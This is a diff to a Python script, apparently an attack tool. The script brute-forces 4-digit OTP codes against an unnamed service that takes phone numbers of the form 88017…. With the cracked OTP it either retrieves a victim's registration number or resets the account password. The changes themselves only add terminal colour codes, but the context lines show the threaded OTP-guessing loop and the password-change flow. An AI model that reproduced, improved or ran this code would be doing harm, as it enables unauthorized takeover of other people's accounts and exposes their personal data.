@@ -5,7 +5,7 @@ from concurrent.futures import ThreadPoolExecutor as TPE
 from queue import Queue as Q
 from sys import stdout
 
-print("initializing...")
+print("i\033[93mn itializing...\033[0m")
 NumberOfThreads = 5
 q = Q()
 with open("4digits.txt") as f:
@@ -26,13 +26,13 @@ what do you want?
 \033[0m""")
 
 def showProgress(done,nowTrying):
-    stdout.write(f"\rNow trying: {nowTrying} | Attack done: {done/100}% ")
+    stdout.write(f"\r \033[91;1mNow trying: {nowTrying} | Attack done: {done/100}% \033[0m")
     stdout.flush()
 
 choice = int(input("(1/2): "))
-phone = input("PhoneNumber(example:88017********): ")
+phone = input("\033[93m PhoneNumber(example:88017********): \033[0m")
 if choice==1:
-    nickname = input("Type nickname(case sensitive): ")
+    nickname = input("\033[93m Type nickname(case sensitive): \033[0m")
     target = getRegNumber(phone,nickname)
     target.req_otp()
     def crack():
@@ -46,7 +46,7 @@ if choice==1:
 
 
 elif choice==2:
-    registration = input("Registration number:")
+    registration = input("\033[93mRegistration number:\033[0m")
     target = ChangePassword(phone, registration)
     target.req_otp()
     def crack():
@@ -55,7 +55,7 @@ elif choice==2:
             target.tryOTP(otp)
             Done = 10000 - q.qsize()
             showProgress(Done,otp)
-    NewPassword = input("Type a new password (atleast 6 charecters long):")
+    NewPassword = input("\033[93m Type a new password (atleast 6 charecters long):\033[0m")
     with TPE(max_workers=NumberOfThreads) as executor:
         executor.submit(crack)
     while target.wrongOTP:
